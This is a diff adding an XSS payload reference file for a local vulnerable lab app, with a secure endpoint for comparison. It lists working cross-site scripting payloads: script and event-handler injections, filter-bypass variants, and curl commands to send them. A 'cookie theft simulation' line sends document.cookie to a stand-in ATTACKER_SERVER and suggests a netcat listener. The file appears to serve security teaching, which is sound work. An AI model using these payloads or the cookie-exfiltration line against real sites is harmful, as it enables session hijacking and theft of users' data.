@@ -1,0 +1,71 @@
+XSS PAYLOAD REFERENCE - For Educational Use Only
+==================================================
+Test these against: http://localhost:8000/vuln/xss?name=<PAYLOAD>
+
+URL-encode special characters when pasting in a browser address bar,
+or use curl (which sends them raw in the URL).
+
+BASIC PAYLOADS
+--------------
+# Classic alert box - confirms XSS is possible
+<script>alert('XSS')</script>
+
+# Show document cookies (session hijacking demo)
+<script>alert(document.cookie)</script>
+
+# Show current origin
+<script>alert(document.location)</script>
+
+
+EVENT HANDLER PAYLOADS (bypass basic <script> filters)
+--------------------------------------------------------
+# onmouseover - fires when user moves mouse over the element
+<img src=x onerror="alert('XSS via img onerror')">
+
+# onerror on a broken image
+<svg onload="alert('XSS via SVG onload')">
+
+# Injected into an attribute context
+" onmouseover="alert('XSS via attribute')
+
+
+COOKIE THEFT SIMULATION
+------------------------
+# In a real attack, the attacker controls evil.com and logs requests
+# Replace ATTACKER_SERVER with a listener (e.g. nc -lvp 8888 or requestbin)
+<script>document.location='http://ATTACKER_SERVER/?stolen='+document.cookie</script>
+
+
+DOM-BASED XSS
+-------------
+# If the page uses location.hash or URL params in innerHTML without sanitizing:
+http://localhost:8000/vuln/xss?name=<img src=1 onerror=alert(1)>
+
+
+FILTER BYPASS TECHNIQUES
+-------------------------
+# Mixed case (bypasses case-sensitive filters)
+<ScRiPt>alert('bypass')</ScRiPt>
+
+# Null byte injection (some parsers truncate at \x00)
+<scr\x00ipt>alert('nullbyte')</scr\x00ipt>
+
+# Double encoding
+%253Cscript%253Ealert('double-encoded')%253C%2Fscript%253E
+
+# JavaScript protocol in href
+<a href="javascript:alert('XSS via href')">Click me</a>
+
+# No quotes, no spaces
+<img/src=x onerror=alert(1)>
+
+
+HOW TO SEND VIA CURL
+---------------------
+curl "http://localhost:8000/vuln/xss?name=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
+
+Or use --data-urlencode:
+curl -G http://localhost:8000/vuln/xss --data-urlencode "name=<script>alert('XSS')</script>"
+
+THEN COMPARE WITH THE SECURE VERSION:
+curl -G http://localhost:8000/secure/xss --data-urlencode "name=<script>alert('XSS')</script>"
